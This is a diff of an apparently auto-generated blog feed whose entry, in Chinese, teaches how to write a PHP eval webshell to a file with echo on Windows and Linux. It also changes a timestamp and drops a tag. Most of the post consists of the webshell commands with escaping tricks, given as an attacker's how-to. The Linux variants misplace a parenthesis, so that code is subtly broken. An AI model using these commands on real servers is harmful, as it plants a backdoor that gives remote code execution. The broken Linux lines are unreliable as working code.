@@ -41,7 +41,7 @@
     <link href="http://yoursite.com/2018/11/26/echo%E5%86%99%E9%A9%AC%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
     <id>http://yoursite.com/2018/11/26/echo写马的小技巧/</id>
     <published>2018-11-26T02:29:22.000Z</published>
-    <updated>2018-11-26T03:08:37.102Z</updated>
+    <updated>2018-11-26T03:18:20.710Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-首先给一个错误的写马方式"><a href="#0x00-首先给一个错误的写马方式" class="headerlink" title="0x00:首先给一个错误的写马方式"></a>0x00:首先给一个错误的写马方式</h2><a id="more"></a><h3 id="0x01-Windows"><a href="#0x01-Windows" class="headerlink" title="0x01:Windows"></a>0x01:Windows</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; &gt; 1.php</code></p><p><img src="/2018/11/26/echo写马的小技巧/errorma.png" alt=""></p><p>你会发现文件里面多了双引号.</p><h3 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02:Linux"></a>0x02:Linux</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p><p><img src="/2018/11/26/echo写马的小技巧/errormalinux.png" alt=""></p><p>$_POST无故消失.</p><h2 id="0x10-正确的写马方式"><a href="#0x10-正确的写马方式" class="headerlink" title="0x10:正确的写马方式"></a>0x10:正确的写马方式</h2><h3 id="0x11-Windows"><a href="#0x11-Windows" class="headerlink" title="0x11:Windows"></a>0x11:Windows</h3><p><code>echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt; 1.php</code></p><p>在尖括号前面加^这个符号.</p><p><img src="/2018/11/26/echo写马的小技巧/rightma.png" alt=""></p><h3 id="0x12-Linux"><a href="#0x12-Linux" class="headerlink" title="0x12:Linux"></a>0x12:Linux</h3><p><code>echo &quot;&lt;?php @eval(\$_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p><p>在$符前加斜杠.</p><p><img src="/2018/11/26/echo写马的小技巧/rightmalinux.png" alt=""></p>]]></content>
     
@@ -51,8 +51,6 @@
     
     </summary>
     
-    
-      <category term="-写马相关" scheme="http://yoursite.com/tags/%E5%86%99%E9%A9%AC%E7%9B%B8%E5%85%B3/"/>
     
   </entry>
   
